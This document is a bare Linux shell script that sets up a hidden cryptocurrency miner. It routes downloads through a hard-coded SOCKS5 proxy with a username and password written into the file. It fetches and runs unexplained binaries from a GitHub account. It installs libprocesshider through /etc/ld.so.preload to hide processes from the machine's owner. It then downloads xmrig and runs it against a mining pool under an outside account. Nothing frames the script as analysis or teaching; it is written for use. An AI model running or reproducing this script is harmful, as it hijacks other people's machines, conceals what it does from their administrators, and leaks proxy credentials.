apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

apt update

apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 188.166.113.250:80
socks5_username = bian15
socks5_password = 150788
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip


git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..


./graftcp/graftcp wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -xf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && ./xmrig  -a CryptoNight-STC -pool stc.ss.dxpool.net:9977 -u nurfasin.gas  --keepalive --timeout 120 --donate-level 1 -p  c=STC,mc=STC,ID=jemby -t 16
